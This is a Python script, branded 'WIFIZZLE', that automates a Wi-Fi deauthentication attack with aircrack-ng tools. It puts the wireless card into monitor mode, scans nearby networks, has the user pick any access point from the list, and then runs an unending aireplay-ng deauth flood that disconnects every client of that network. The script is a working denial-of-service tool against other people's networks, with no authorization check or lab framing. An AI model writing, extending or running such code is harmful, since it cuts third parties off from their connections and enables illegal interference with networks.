import os
import subprocess
import time

# ANSI escape codes for colors
BLUE = '\033[94m'
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
ENDC = '\033[0m'

# Print a message indicating the start of the program
print("Please wait.....")

# Print a welcome message
print(f"""{BLUE}
      
      
██╗    ██╗██╗███████╗██╗███████╗███████╗██╗     ███████╗
██║    ██║██║██╔════╝██║╚══███╔╝╚══███╔╝██║     ██╔════╝
██║ █╗ ██║██║█████╗  ██║  ███╔╝   ███╔╝ ██║     █████╗  
██║███╗██║██║██╔══╝  ██║ ███╔╝   ███╔╝  ██║     ██╔══╝  
╚███╔███╔╝██║██║     ██║███████╗███████╗███████╗███████╗
 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝╚══════╝╚══════╝
                                                        

""")

# Define a function to get the Wi-Fi interface name
def get_wifi_interface():        
    cmd = """iw dev | awk '$1=="Interface"{print $2}'"""
    result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    return result.stdout.strip()

# Get Wi-Fi interface and check if it exists
interface = get_wifi_interface()
if not interface:
    print(f"{RED}No Wi-Fi interface found!{ENDC}")
    exit(1)

print(f"Wi-Fi interface: {interface}")

# Function to parse the airodump-ng output from the CSV file and list BSSIDs
def parse_bssids_from_csv(csv_file):
    bssids = []
    ssid_map = {}
    with open(csv_file, 'r') as f:
        lines = f.readlines()

    # Parse the BSSIDs and SSIDs from the CSV file
    for line in lines:
        parts = line.split(',')
        if len(parts) > 13 and len(parts[0].strip()) == 17:  # Valid BSSID format
            bssid = parts[0].strip()
            ssid = parts[13].strip()
            bssids.append(bssid)
            ssid_map[bssid] = ssid

    return bssids, ssid_map

# Main loop of the program
while True:
    print(f"""\n{YELLOW}
1. Start monitor mode
2. Exit monitor mode 
3. Scan Wi-Fi networks
4. Exit
{ENDC}""")
    try:
        # Get user input
        i = input("\n O.W.D > ")
        
        # Check user input and perform actions accordingly
        if i == '1':
            # Start monitor mode using airmon-ng
            print(f"{GREEN}Starting monitor mode...{ENDC}")
            os.system(f"sudo airmon-ng start {interface}")
            interface = get_wifi_interface()
        elif i == '2':
            # Stop monitor mode using airmon-ng
            print(f"{GREEN}Stopping monitor mode...{ENDC}")
            os.system(f"sudo airmon-ng stop {interface}")
        elif i == '3':
            # Scan for Wi-Fi networks using airodump-ng and capture output to a CSV file
            print(f"{GREEN}Scanning for Wi-Fi networks...{ENDC}")
            csv_file = "scan_results.csv"
            os.system(f"sudo airodump-ng --write-interval 1 --write {csv_file} --output-format csv {interface}")
            
            # Wait for a few seconds to collect some data
            time.sleep(10)
            
            # Parse the captured CSV to list available BSSIDs
            bssids, ssid_map = parse_bssids_from_csv(f"{csv_file}-01.csv")
            
            if not bssids:
                print(f"{RED}No networks found!{ENDC}")
                continue

            print(f"\n{GREEN}Available Networks:{ENDC}")
            for idx, bssid in enumerate(bssids):
                print(f"{idx+1}. {bssid} ({ssid_map[bssid]})")

            # Let the user choose a BSSID
            selected_index = int(input(f"\nSelect a network by number (1-{len(bssids)}): ")) - 1
            if selected_index < 0 or selected_index >= len(bssids):
                print(f"{RED}Invalid selection!{ENDC}")
                continue

            selected_bssid = bssids[selected_index]
            print(f"{YELLOW}Selected BSSID: {selected_bssid} ({ssid_map[selected_bssid]}){ENDC}")

            # Deauthenticate clients using aireplay-ng
            print(f"{YELLOW}Deauthenticating clients from BSSID {selected_bssid}...{ENDC}")
            os.system(f"sudo aireplay-ng -D --deauth 0 --ignore-negative-one -a {selected_bssid} {interface}")
        elif i == '4':
            # Exit the program
            print(f"{RED}Exiting...{ENDC}")
            if 'mon' in interface:
                os.system(f"sudo airmon-ng stop {interface}")
                os.system(f"sudo rm scan_results.csv-01.csv")
                break
            elif "scan_results" in os.getcwd():
                os.system(f"sudo rm scan_results.csv-01.csv")
                print(f"{RED}Exiting...{ENDC}")
                break
            else:
                break
        else:
            print(f"{RED}Invalid option! Please choose a valid number.{ENDC}")
    except KeyboardInterrupt:
        # Handle KeyboardInterrupt (Ctrl+C)
        print(f"\n\n{RED}Program interrupted!{ENDC}")
        i2 = input("Exit? [y/n]? ")
        if i2.lower() == "y":
            # Exit the program
            print(f"{RED}Exiting...{ENDC}")
            if 'mon' in interface:
                os.system(f"sudo airmon-ng stop {interface}")
                os.system(f"sudo rm scan_results.csv-01.csv")
                break
            elif "scan_results" in os.getcwd():
                os.system(f"sudo rm scan_results.csv-01.csv")
                print(f"{RED}Exiting...{ENDC}")
                break
            else:
                break
        elif i2.lower() == "n":
            # Continue program execution
            pass
